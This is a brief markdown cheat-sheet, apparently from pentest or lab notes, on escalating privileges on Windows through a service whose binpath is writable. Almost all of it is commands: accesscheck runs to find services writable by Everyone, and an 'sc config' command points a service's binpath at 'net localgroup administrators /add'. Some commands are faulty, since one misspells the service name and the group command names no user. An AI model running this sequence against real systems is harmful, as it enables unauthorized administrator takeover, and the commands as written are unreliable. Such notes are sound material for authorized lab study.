# Privilege Escalation via Windows Service binpath
- PowerUp
- accesscheck (sysinternals)
- sc

Using Accesscheck to find items we can write to as Everyone, suppressing errors and displaying service names
```
accesscheck64.exe -uwcv Everyone *
```
```
accesscheck64.exe -uwcv daclsvc
```
```
sc qc daclsv
```
```
sc config daclsvc binpath= "net localgroup administrators /add"
```
